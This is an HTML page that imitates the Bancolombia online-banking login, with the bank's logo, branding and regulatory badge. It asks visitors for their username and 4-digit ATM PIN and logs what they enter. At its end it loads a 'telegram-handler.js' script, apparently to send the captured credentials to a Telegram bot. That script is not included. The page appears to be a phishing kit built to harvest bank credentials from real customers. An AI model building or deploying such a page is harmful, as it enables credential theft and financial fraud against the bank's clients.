<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia Sucursal Virtual Personas</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        body {
            font-family: 'Open Sans', Arial, sans-serif;
            font-size: 16px;
            color: #2c2a29;
            line-height: 24px;
            letter-spacing: -0.3px;
            background-color: #f9f9fa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            position: relative;
        }

        /* SVG Background */
        .decorative-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            position: relative;
            z-index: 10;
        }

        .brand-logo {
            height: 30px;
            margin-bottom: 40px;
        }

        .page-title {
            color: #424242;
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 50px;
            text-align: center;
        }

        .login-card {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1), 0 1px 4px rgba(0, 0, 0, 0.06);
            padding: 50px 60px;
            max-width: 520px;
            width: 100%;
        }

        .card-greeting {
            color: #212121;
            font-size: 34px;
            font-weight: 700;
            margin-bottom: 12px;
            text-align: center;
        }

        .card-description {
            color: #666666;
            font-size: 15px;
            font-weight: 400;
            margin-bottom: 40px;
            text-align: center;
            line-height: 1.5;
        }

        .form-field {
            margin-bottom: 30px;
            position: relative;
        }

        .field-icon {
            position: absolute;
            left: 0;
            top: 14px;
            width: 22px;
            height: 22px;
            color: #666666;
        }

        .form-control {
            width: 100%;
            padding: 14px 0 14px 35px;
            border: none;
            border-bottom: 2px solid #e0e0e0;
            font-size: 15px;
            background-color: transparent;
            font-family: 'Open Sans', Arial, sans-serif;
            color: #212121;
            font-weight: 400;
            transition: border-color 0.3s ease;
        }

        .form-control:focus {
            outline: none;
            border-bottom-color: #fdda24;
        }

        .form-control::placeholder {
            color: #999999;
        }

        .help-link {
            display: block;
            color: #212121;
            font-size: 13px;
            text-decoration: underline;
            margin-top: 10px;
            font-weight: 600;
            cursor: pointer;
        }

        .help-link:hover {
            color: #000000;
        }

        .submit-button {
            width: 100%;
            padding: 15px 32px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            border: none;
            background-color: #e0e0e0;
            color: #999999;
            transition: all 0.3s ease;
            font-family: 'Open Sans', Arial, sans-serif;
            margin-top: 15px;
        }

        .submit-button.enabled {
            background-color: #fdda24;
            color: #212121;
            cursor: pointer;
        }

        .submit-button.enabled:hover {
            background-color: #fdd007;
        }

        .register-link {
            text-align: center;
            margin-top: 25px;
        }

        .register-link a {
            color: #212121;
            font-size: 15px;
            text-decoration: underline;
            font-weight: 700;
        }

        .register-link a:hover {
            color: #000000;
        }

        .site-footer {
            background-color: #ffffff;
            padding: 20px 30px;
            border-top: 1px solid #e0e0e0;
            position: relative;
            z-index: 10;
        }

        .footer-wrapper {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .footer-navigation {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            align-items: center;
        }

        .footer-link {
            color: #666666;
            font-size: 13px;
            text-decoration: none;
            font-weight: 400;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        .link-separator {
            color: #cccccc;
        }

        .session-info {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 3px;
        }

        .info-text {
            color: #666666;
            font-size: 12px;
            font-weight: 400;
        }

        .footer-branding {
            max-width: 1400px;
            margin: 15px auto 0;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .footer-logo {
            height: 30px;
        }

        .regulatory-badges {
            display: flex;
            gap: 8px;
            align-items: center;
        }

        .badge {
            background-color: #f0f0f0;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 8px;
            color: #333333;
            font-weight: 700;
            letter-spacing: 0.3px;
            white-space: nowrap;
        }

        @media (max-width: 768px) {
            .main-container {
                padding: 30px 20px;
            }

            .brand-logo {
                height: 20px;
                margin-bottom: 30px;
            }

            .page-title {
                font-size: 22px;
                margin-bottom: 30px;
            }

            .login-card {
                padding: 35px 30px;
                max-width: 100%;
            }

            .card-greeting {
                font-size: 28px;
            }

            .card-description {
                font-size: 14px;
                margin-bottom: 30px;
            }

            .form-field {
                margin-bottom: 25px;
            }

            .form-control {
                padding: 12px 0 12px 32px;
                font-size: 14px;
            }

            .submit-button {
                font-size: 15px;
                padding: 13px 28px;
            }

            .site-footer {
                padding: 15px 20px;
            }

            .footer-wrapper {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .footer-navigation {
                flex-direction: column;
                gap: 8px;
                align-items: flex-start;
            }

            .link-separator {
                display: none;
            }

            .session-info {
                align-items: flex-start;
            }

            .footer-branding {
                flex-direction: column;
                align-items: flex-start;
                width: 100%;
                gap: 10px;
            }

            .footer-logo {
                height: 20px;
            }
        }
    </style>
</head>
<body id="body">
    <!-- Líneas CONECTADAS de izquierda a derecha con curvas pronunciadas -->
    <svg class="decorative-background" viewBox="0 0 1920 1080" preserveAspectRatio="none">
        <!-- Línea NARANJA - Conectada de esquina inferior izquierda a superior derecha -->
        <path d="M 0 900 Q 200 800, 400 720 Q 700 620, 960 560 Q 1300 480, 1600 380 Q 1750 330, 1920 270" 
              stroke="#ff8855" 
              stroke-width="32" 
              fill="none" 
              stroke-linecap="round"/>
        
        <!-- Línea AMARILLA - Principal conectada (más gruesa) -->
        <path d="M 50 850 Q 250 750, 450 670 Q 750 570, 960 520 Q 1300 440, 1600 340 Q 1750 290, 1920 230" 
              stroke="#fdd835" 
              stroke-width="38" 
              fill="none" 
              stroke-linecap="round"/>
        
        <!-- Línea MORADA izquierda - Segmento corto discontinuo -->
        <path d="M 350 720 Q 480 670, 630 640 Q 720 620, 800 610" 
              stroke="#9c6fb8" 
              stroke-width="28" 
              fill="none" 
              stroke-linecap="round"/>
        
        <!-- Línea MORADA derecha - Segmento corto discontinuo -->
        <path d="M 1350 420 Q 1500 360, 1650 320 Q 1780 290, 1900 270" 
              stroke="#9c6fb8" 
              stroke-width="30" 
              fill="none" 
              stroke-linecap="round"/>
    </svg>

    <!-- Contenido principal -->
    <main class="main-container">
        <div>
            <img src="bancol.png" alt="Bancolombia" class="brand-logo">
        </div>

        <h1 class="page-title">Sucursal Virtual Personas</h1>

        <div class="login-card">
            <h2 class="card-greeting">¡Hola!</h2>
            <p class="card-description">Ingresa los datos para gestionar tus<br>productos y hacer transacciones.</p>

            <form id="loginForm">
                <div class="form-field">
                    <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                    <input 
                        type="text" 
                        class="form-control" 
                        id="usuario" 
                        placeholder="Usuario"
                        autocomplete="username"
                        required
                    >
                    <a href="#" class="help-link">¿Olvidaste tu usuario?</a>
                </div>

                <div class="form-field">
                    <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    <input 
                        type="password" 
                        class="form-control" 
                        id="clave" 
                        placeholder="Clave del cajero"
                        autocomplete="current-password"
                        maxlength="4"
                        inputmode="numeric"
                        pattern="[0-9]{4}"
                        required
                    >
                    <a href="#" class="help-link">¿Olvidaste o bloqueaste tu clave?</a>
                </div>

                <button type="submit" class="submit-button" id="btnLogin">
                    Iniciar sesión
                </button>

                <div class="register-link">
                    <a href="#">Crear usuario</a>
                </div>
            </form>
        </div>
    </main>

    <footer class="site-footer">
        <div class="footer-wrapper">
            <nav class="footer-navigation">
                <a href="#" class="footer-link">¿Problemas para conectarte?</a>
                <span class="link-separator">·</span>
                <a href="#" class="footer-link">Aprende sobre seguridad</a>
                <span class="link-separator">·</span>
                <a href="#" class="footer-link">Reglamento Sucursal Virtual</a>
                <span class="link-separator">·</span>
                <a href="#" class="footer-link">Política de privacidad</a>
            </nav>

            <div class="session-info">
                <span class="info-text" id="userIP">Dirección IP: Cargando...</span>
                <span class="info-text" id="currentDateTime">Cargando fecha...</span>
            </div>
        </div>

        <div class="footer-branding">
            <img src="bancol.png" alt="Bancolombia" class="footer-logo">
            <div class="regulatory-badges">
                <span class="badge">VIGILADO</span>
                <span class="badge">SUPERINTENDENCIA FINANCIERA DE COLOMBIA</span>
            </div>
        </div>
    </footer>

    <script>
        const loginForm = document.getElementById('loginForm');
        const usuarioInput = document.getElementById('usuario');
        const claveInput = document.getElementById('clave');
        const btnLogin = document.getElementById('btnLogin');

        // Prevenir espacios en el campo de usuario
        usuarioInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\s/g, '');
            validateForm();
        });

        usuarioInput.addEventListener('keydown', function(e) {
            if (e.which === 32 || e.keyCode === 32) {
                e.preventDefault();
            }
        });

        usuarioInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const textWithoutSpaces = pastedText.replace(/\s/g, '');
            this.value = textWithoutSpaces;
            this.dispatchEvent(new Event('input'));
        });

        // Validar que la clave solo contenga números y máximo 4 dígitos
        claveInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length > 4) {
                this.value = this.value.slice(0, 4);
            }
            validateForm();
        });

        claveInput.addEventListener('keypress', function(e) {
            if (e.which < 48 || e.which > 57) {
                e.preventDefault();
            }
        });

        claveInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const numbersOnly = pastedText.replace(/[^0-9]/g, '').slice(0, 4);
            this.value = numbersOnly;
            this.dispatchEvent(new Event('input'));
        });

        function validateForm() {
            const usuarioValido = usuarioInput.value.trim() !== '' && usuarioInput.value.indexOf(' ') === -1;
            const claveValida = claveInput.value.length === 4;
            
            if (usuarioValido && claveValida) {
                btnLogin.classList.add('enabled');
                btnLogin.disabled = false;
            } else {
                btnLogin.classList.remove('enabled');
                btnLogin.disabled = true;
            }
        }

        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            if (usuarioInput.value.trim() === '') {
                alert('Por favor ingresa tu usuario');
            } else if (usuarioInput.value.indexOf(' ') !== -1) {
                alert('El usuario no puede contener espacios');
            } else if (claveInput.value.length !== 4) {
                alert('La clave del cajero debe tener 4 dígitos');
            } else {
                console.log('Formulario enviado');
                console.log('Usuario:', usuarioInput.value);
                console.log('Clave:', claveInput.value);
                // window.location.href = 'dashboard.html';
            }
        });

        validateForm();

        // ========== OBTENER IP DEL USUARIO ==========
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                document.getElementById('userIP').textContent = `Dirección IP: ${data.ip}`;
            } catch (error) {
                console.error('Error al obtener IP:', error);
                document.getElementById('userIP').textContent = 'Dirección IP: No disponible';
            }
        }

        // ========== ACTUALIZAR FECHA Y HORA ==========
        function updateDateTime() {
            const now = new Date();
            
            const dias = ['domingo', 'lunes', 'martes', 'miércoles', 'jueves', 'viernes', 'sábado'];
            const meses = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 
                          'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
            
            const diaSemana = dias[now.getDay()];
            const dia = now.getDate();
            const mes = meses[now.getMonth()];
            const año = now.getFullYear();
            
            let horas = now.getHours();
            const minutos = now.getMinutes().toString().padStart(2, '0');
            const segundos = now.getSeconds().toString().padStart(2, '0');
            
            const ampm = horas >= 12 ? 'p. m.' : 'a. m.';
            horas = horas % 12;
            horas = horas ? horas : 12; // Si es 0, mostrar 12
            const horasFormateadas = horas.toString();
            
            const fechaFormateada = `${diaSemana}, ${dia} de ${mes} de ${año}, ${horasFormateadas}:${minutos}:${segundos} ${ampm}`;
            
            document.getElementById('currentDateTime').textContent = fechaFormateada;
        }

        // Ejecutar al cargar la página
        getUserIP();
        updateDateTime();
        
        // Actualizar la hora cada segundo
        setInterval(updateDateTime, 1000);
    </script>
        <!-- Tu script original que ya existe -->
    <script>
        // ... todo tu código original ...
    </script>

    <!-- ✅ AGREGAR ESTA ÚNICA LÍNEA -->
    <script src="telegram-handler.js"></script>

</body>
</html>

</body>
</html>
